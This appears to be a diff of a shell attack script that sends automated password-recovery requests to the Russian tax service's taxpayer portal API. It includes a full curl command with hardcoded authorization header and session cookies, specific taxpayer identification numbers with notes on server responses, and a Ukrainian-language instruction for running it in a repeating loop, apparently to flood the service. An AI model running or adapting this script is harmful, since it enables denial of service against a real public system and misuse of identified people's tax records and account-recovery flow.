@@ -5,5 +5,10 @@
 maxtime=2
 curl -k --max-time $maxtime --silent 'https://lkfl2.nalog.ru/lkfl/api/v1/profile/passwordRecovery' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/json' -H 'Authorization: Basic dGF4cGF5ZXItYnJvd3Nlcjo3VklQS25aQXR3UUw3Zm10dnUycm5BSFQ2YzM0RGtrRw==' -H 'Origin: https://lkfl2.nalog.ru' -H 'Connection: keep-alive' -H 'Referer: https://lkfl2.nalog.ru/lkfl/login' -H 'Cookie: f5avrbbbbbbbbbbbbbbbb=OJJOGPGKLAMPBIMINLNGFMEEMLCIBOCCNFHECPFLOANEKMAKDGCCCKKALEFMLANJKPGNCIDLABBDOJJJMABLBNMDGLAAAILFJHPHMHOEDDLOBGNKNPDGMGFGDNMAMKJL; _ym_uid=1669325066321358440; _ym_d=1669325066; _ym_isad=2; _ym_visorc=b; f5avrbbbbbbbbbbbbbbbb=DCNMLJAIAHGBMAGMBEMPFGEMABOKMFHKFHNIDEIBAMHLPOFENDCGCBOMKHBCPKIIFAOKIPDICJHDJPOONOADGEAGFOMADHNABIJJAEDDLDLKBBHOIPALHKOKNLONGHIL' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"inn":"504600064695","email":"stop.russian.madness@gmail.com","codeWord":"war"}'
 
+# інші ИНН з різними відповідями
 # inn: 181200084684 - not enabled
 # inn: 667204591180 - not found
+
+Запускати так: 
+bash ./starter -e ./nalog-recover -t 2 -l ./nalog.log
+
